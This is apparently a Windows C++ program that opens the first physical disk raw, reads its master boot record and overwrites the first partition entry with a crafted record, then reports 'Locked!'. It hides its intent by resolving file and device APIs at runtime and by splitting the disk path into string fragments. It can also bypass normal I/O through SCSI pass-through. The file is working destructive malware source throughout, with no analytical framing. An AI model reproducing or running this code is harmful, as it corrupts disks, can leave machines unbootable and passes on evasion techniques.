#include "stdafx.h"

#define _USE_PHYS TRUE
#define _USE_NT_CREATE FALSE
#define _USE_SCSI TRUE

typedef
HANDLE
(WINAPI* CreateFileW_t)(
	_In_ LPCWSTR lpFileName,
	_In_ DWORD dwDesiredAccess,
	_In_ DWORD dwShareMode,
	_In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	_In_ DWORD dwCreationDisposition,
	_In_ DWORD dwFlagsAndAttributes,
	_In_opt_ HANDLE hTemplateFile
	);

typedef
DWORD
(WINAPI* SetFilePointer_t)(
	_In_ HANDLE hFile,
	_In_ LONG lDistanceToMove,
	_Inout_opt_ PLONG lpDistanceToMoveHigh,
	_In_ DWORD dwMoveMethod
	);

typedef
BOOL
(WINAPI* ReadFile_t)(
	_In_ HANDLE hFile,
	_Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) __out_data_source(FILE) LPVOID lpBuffer,
	_In_ DWORD nNumberOfBytesToRead,
	_Out_opt_ LPDWORD lpNumberOfBytesRead,
	_Inout_opt_ LPOVERLAPPED lpOverlapped
	);

typedef
BOOL
(WINAPI* WriteFile_t)(
	_In_ HANDLE hFile,
	_In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer,
	_In_ DWORD nNumberOfBytesToWrite,
	_Out_opt_ LPDWORD lpNumberOfBytesWritten,
	_Inout_opt_ LPOVERLAPPED lpOverlapped
	);

typedef
BOOL
(WINAPI* DeviceIoControl_t)(
	_In_ HANDLE hDevice,
	_In_ DWORD dwIoControlCode,
	_In_reads_bytes_opt_(nInBufferSize) LPVOID lpInBuffer,
	_In_ DWORD nInBufferSize,
	_Out_writes_bytes_to_opt_(nOutBufferSize, *lpBytesReturned) LPVOID lpOutBuffer,
	_In_ DWORD nOutBufferSize,
	_Out_opt_ LPDWORD lpBytesReturned,
	_Inout_opt_ LPOVERLAPPED lpOverlapped
	);

typedef
BOOL
(WINAPI* CloseHandle_t)(
	_In_ _Post_ptr_invalid_ HANDLE hObject
	);

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
}  OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef
NTSTATUS
(WINAPI* NtCreateFile_t)(
	PHANDLE            FileHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK   IoStatusBlock,
	PLARGE_INTEGER     AllocationSize,
	ULONG              FileAttributes,
	ULONG              ShareAccess,
	ULONG              CreateDisposition,
	ULONG              CreateOptions,
	PVOID              EaBuffer,
	ULONG              EaLength
	);

HMODULE Kernel32Dll = LoadLibraryA("Kernel32.dll");
CreateFileW_t LoadedCreateFileW = (CreateFileW_t)GetProcAddress(Kernel32Dll, "CreateFileW");
ReadFile_t LoadedReadFile = (ReadFile_t)GetProcAddress(Kernel32Dll, "ReadFile");
WriteFile_t LoadedWriteFile = (WriteFile_t)GetProcAddress(Kernel32Dll, "WriteFile");
SetFilePointer_t LoadedSetFilePointer = (SetFilePointer_t)GetProcAddress(Kernel32Dll, "SetFilePointer");
DeviceIoControl_t LoadedDeviceIoControl = (DeviceIoControl_t)GetProcAddress(Kernel32Dll, "DeviceIoControl");
CloseHandle_t LoadedCloseHandle = (CloseHandle_t)GetProcAddress(Kernel32Dll, "CloseHandle");

HMODULE NtDllDll = LoadLibraryA("NtDll.dll");
NtCreateFile_t LoadedNtCreateFile = (NtCreateFile_t)GetProcAddress(NtDllDll, "NtCreateFile");

template <typename T>
inline
T
swap_endian(
	IN T u
)
{
	union
	{
		T u;
		unsigned char u8[sizeof(T)];
	} source, dest;

	source.u = u;

	for (size_t k = 0; k < sizeof(T); k++)
		dest.u8[k] = source.u8[sizeof(T) - k - 1];

	return dest.u;
}

#define RTL_CONSTANT_STRING(s) \
	{sizeof(s)-sizeof(WCHAR),sizeof(s)-sizeof(WCHAR),(PWSTR)s}
#define RTL_CONSTANT_OBJECT_ATTRIBUTES(n, a) \
	{ sizeof(OBJECT_ATTRIBUTES), NULL, RTL_CONST_CAST(PUNICODE_STRING)(n), a, NULL, NULL }

#define OBJ_CASE_INSENSITIVE 0x00000040

#define FILE_OPEN                       0x00000001

#define FILE_NON_DIRECTORY_FILE                 0x00000040

typedef  struct  _SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER {
	SCSI_PASS_THROUGH_DIRECT ScsiCmd;
	SENSE_DATA SenseData;
} SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER, * PSCSI_PASS_THROUGH_DIRECT_WITH_BUFFER;

typedef  struct  _SCSI_PASS_THROUGH_WITH_BUFFER {
	SCSI_PASS_THROUGH ScsiCmd;
	SENSE_DATA SenseData;
} SCSI_PASS_THROUGH_WITH_BUFFER, * PSCSI_PASS_THROUGH_WITH_BUFFER;

BOOL ScsiReadWriteDisk(HANDLE hDisk, BOOLEAN IsRead, ULONG64 OffsetInSector, PVOID pBuffer, ULONG32 SizeOfBufferInSector, BOOLEAN IsCdb16 = TRUE)
{
	SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER ScsiBuffer{ 0 };
	PCDB pCdb = (PCDB)ScsiBuffer.ScsiCmd.Cdb;
	ScsiBuffer.ScsiCmd.Length = sizeof(SCSI_PASS_THROUGH_DIRECT);
	ScsiBuffer.ScsiCmd.SenseInfoLength = sizeof(ScsiBuffer.SenseData);
	if (IsRead)
	{
		ScsiBuffer.ScsiCmd.DataIn = SCSI_IOCTL_DATA_IN;
		pCdb->CDB12.OperationCode = IsCdb16 ? 0x88 : SCSIOP_READ12;
	}
	else
	{
		ScsiBuffer.ScsiCmd.DataIn = SCSI_IOCTL_DATA_OUT;
		pCdb->CDB12.OperationCode = IsCdb16 ? 0x8A : SCSIOP_WRITE12;
	}
	ScsiBuffer.ScsiCmd.DataTransferLength = SizeOfBufferInSector * 512;
	ScsiBuffer.ScsiCmd.TimeOutValue = (ScsiBuffer.ScsiCmd.DataTransferLength >> 10) + 5;
	ScsiBuffer.ScsiCmd.DataBuffer = pBuffer;
	ScsiBuffer.ScsiCmd.SenseInfoOffset = offsetof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER, SenseData);
	if (IsCdb16)
	{
		ScsiBuffer.ScsiCmd.CdbLength = 16;
		*(PULONG64)pCdb->CDB16.LogicalBlock = swap_endian<ULONG64>(OffsetInSector);
		*(PULONG32)pCdb->CDB16.TransferLength = swap_endian<ULONG32>(SizeOfBufferInSector);
	}
	else
	{
		ScsiBuffer.ScsiCmd.CdbLength = CDB12GENERIC_LENGTH;
		*(PULONG32)pCdb->CDB12.LogicalBlock = swap_endian<ULONG32>((ULONG32)OffsetInSector);
		*(PULONG32)pCdb->CDB12.TransferLength = swap_endian<ULONG32>(SizeOfBufferInSector);
	}

	DWORD Returned = 0;
	return LoadedDeviceIoControl(hDisk, IOCTL_SCSI_PASS_THROUGH_DIRECT, &ScsiBuffer.ScsiCmd, sizeof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER), &ScsiBuffer.ScsiCmd, sizeof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER), &Returned, NULL)
		&& !ScsiBuffer.ScsiCmd.ScsiStatus;
}

int
wmain(
	uint16_t argc,
	wchar_t** argv
)
{
	if (!Kernel32Dll || !NtDllDll)
	{
		spdlog::error("Load module error,GetLastError():{}", GetLastError());

		return GetLastError();
	}

#if _USE_NT_CREATE
#if _USE_PHYS
	wchar_t DriveString1[] = { L"\\Devi" };
	wchar_t DriveString2[] = { L"ce\\Hardd" };
	wchar_t DriveString3[] = { L"isk0\\D" };
	wchar_t DriveString4[] = { L"R0" };
	auto FullString = fmt::format(L"{}{}{}{}", DriveString1, DriveString2, DriveString3, DriveString4);
#else
	wchar_t DriveString1[] = { L"\\\\" };
	wchar_t DriveString2[] = { L".\\Harddis" };
	wchar_t DriveString3[] = { L"k0Partition3" };
	auto FullString = fmt::format(L"{}{}{}", DriveString1, DriveString2, DriveString3);
#endif

	HANDLE DiskHandle = INVALID_HANDLE_VALUE;
	UNICODE_STRING ObjectName{};
	ObjectName.Buffer = (PWSTR)FullString.c_str();
	ObjectName.Length = ObjectName.MaximumLength = FullString.size() * sizeof(wchar_t);
	OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(&ObjectName, OBJ_CASE_INSENSITIVE);
	IO_STATUS_BLOCK StatusBlock{};
	NTSTATUS Status = LoadedNtCreateFile(&DiskHandle, FILE_WRITE_DATA | FILE_READ_DATA, &ObjectAttributes, &StatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE | FILE_SHARE_READ, FILE_OPEN, 0, NULL, 0);
#else
#if _USE_PHYS
	wchar_t DriveString1[] = { L"\\\\" };
	wchar_t DriveString2[] = { L".\\Physica" };
	wchar_t DriveString3[] = { L"lDrive0" };
	auto FullString = fmt::format(L"{}{}{}", DriveString1, DriveString2, DriveString3);
#else
	wchar_t DriveString1[] = { L"\\\\" };
	wchar_t DriveString2[] = { L".\\Harddis" };
	wchar_t DriveString3[] = { L"k0Partition3" };
	auto FullString = fmt::format(L"{}{}{}", DriveString1, DriveString2, DriveString3);
#endif

	auto DiskHandle = LoadedCreateFileW(FullString.c_str(), FILE_WRITE_DATA | FILE_READ_DATA, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
#endif

	std::wcout << FullString << std::endl;
	if (DiskHandle != INVALID_HANDLE_VALUE)
	{
		LARGE_INTEGER Pos{ 0 };
		DWORD Bytes = 0;
		BYTE Sector[0x200]{ 0x00 };
#if _USE_SCSI
		if (ScsiReadWriteDisk(DiskHandle, TRUE, 0, Sector, sizeof(Sector) / 0x200))
#else
		LoadedSetFilePointer(DiskHandle, Pos.LowPart, &Pos.HighPart, FILE_BEGIN);
		if (LoadedReadFile(DiskHandle, Sector, sizeof(Sector), &Bytes, NULL))
#endif
		{
			Sector[0x1BE] = 0x80;
			Sector[0x1BF] = 0xFE;
			Sector[0x1C0] = 0xFF;
			Sector[0x1C1] = 0xFF;
			Sector[0x1C2] = 0x0F;
			Sector[0x1C3] = 0xFE;
			Sector[0x1C4] = 0xFF;
			Sector[0x1C5] = 0xFF;
			Sector[0x1C6] = 0x00;
			Sector[0x1C7] = 0x00;
			Sector[0x1C8] = 0x00;
			Sector[0x1C9] = 0x00;
			Sector[0x1CA] = 0x01;
			Sector[0x1CB] = 0x00;
			Sector[0x1CC] = 0x00;
			Sector[0x1CD] = 0x00;

#if _USE_SCSI
			if (ScsiReadWriteDisk(DiskHandle, FALSE, 0, Sector, sizeof(Sector) / 0x200))
#else
			LoadedSetFilePointer(DiskHandle, Pos.LowPart, &Pos.HighPart, FILE_BEGIN);
			if (LoadedWriteFile(DiskHandle, Sector, sizeof(Sector), &Bytes, NULL))
#endif
			{
				spdlog::info("Locked!");
			}
			else
				spdlog::error("WriteFile error,GetLastError():{}", GetLastError());
		}
		else
			spdlog::error("ReadFile error,GetLastError():{}", GetLastError());

		LoadedCloseHandle(DiskHandle);
	}
	else
		spdlog::error("CreateFile error,GetLastError():{}", GetLastError());

	_getch();

	return GetLastError();
}